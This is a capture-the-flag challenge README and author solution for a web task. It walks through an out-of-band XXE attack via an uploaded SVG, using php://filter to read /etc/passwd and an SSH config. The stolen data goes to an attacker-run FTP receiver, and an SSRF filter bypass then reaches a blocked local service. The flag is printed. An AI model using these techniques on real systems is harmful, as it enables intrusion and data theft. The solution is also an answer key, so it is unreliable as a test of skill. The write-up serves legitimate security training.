# XXE OOB via SVG + SSRF + SSRF bypass

## Version

Date        | Author                  | Contact               | Version | Comment
---         | ---                     | ---                   | ---     | ---
03/11/2019  | noraj (Alexandre ZANNI) | noraj#0833 on discord | 1.0     | Document creation

Information displayed for CTF players:

+ **Name of the challenge** / **Nom du challenge**: `Image Checker 2`
+ **Category** / **Catégorie**: `Web`
+ **Internet**: not needed
+ **Difficulty** / **Difficulté**: Very difficult / très difficile

### Description

```
noraj is hiding something...

Flag format: sigsegv{flag}

author: [noraj](https://pwn.by/noraj/)
```

### Hints

- Hint1: SVG
- Hint2: XXE
- Hint3: SSRF
- Hint4: SSH (user) config

## Integration

This challenge require a Docker Engine and Docker Compose.

Builds, (re)creates, starts, and attaches to containers for a service:

```
$ docker-compose up --build
```

Add `-d` if you want to detach the container.

## Solving

### Author solution

More hardcore version of *Image Checker 1* so first steps are the same but this
time the flag is not easily hidden in `/etc/passwd` but on a remote service.

1. The app ask for a SVG.
2. Other file types seem to be refused.
3. Let's pick a legit svg and sent it to see what happens. Alternatively just load `view.php` without parameter.
4. The app seems to parse info from the file.
5. Since SVG is a XML let's try a XXE attack.
6. We can't see any errors, let's try a XXE OOB.
7. Let's start a HTTP server to deliver payloads (`xxe.svg` & `xxe.xml`) and...
8. ... let's start a FTP OOB extraction receiver ([xxeserv](https://github.com/staaldraad/xxeserv)):
    ```
    ./xxeserv -p 2121 -w -wd /home/noraj/dir/ -wp 8080
    ```
9. Send the payload: http://x.x.x.x:42421/view.php?svg=http://192.168.1.84:8080/xxe.svg. (see `xxe.svg` & `xxe.xml`)
10. Read `/etc/passwd`, the home of the user `noraj` is `/home/noraj/`. Change the `data` paylaod in `xxe.xml` to:
    ```
    php://filter/convert.base64-encode/resource=/etc/passwd
    ```
11. Let's try to find juicy files like `.bash_hisotry`, `.profile`, etc. the only one which exists is `/home/noraj/.ssh/config`. Change the `data` paylaod in `xxe.xml` to:
    ```
    php://filter/convert.base64-encode/resource=/home/noraj/.ssh/config
    ```
12. The ssh config file is leaking the `hiddenservice` domaine name.
13. Then bruteforce port to find the port where a service is available: http://hiddenservice:9999. (see bruteforce script `bf_ports.rb` with in depth explanation in comments)
14. We have to request http://127.0.0.1:10000 but port and host are blocked, we have to bypass it.
15. Do an SSRF bypass. Change the `data` paylaod in `xxe.xml` to:
    ```
    php://filter/convert.base64-encode/resource=http://hiddenservice:9999?url=http://127.0.0.1:10000
    ```
    with
    ```
    php://filter/convert.base64-encode/resource=http://hiddenservice:9999/?url=http://127.0.0.1:10000%23@google.com:80/
    ```

## Flag

`sigsegv{so_y0u_ar3_r3a11y_s3eri0us_4bout_XXE_4nd_SSRF}`
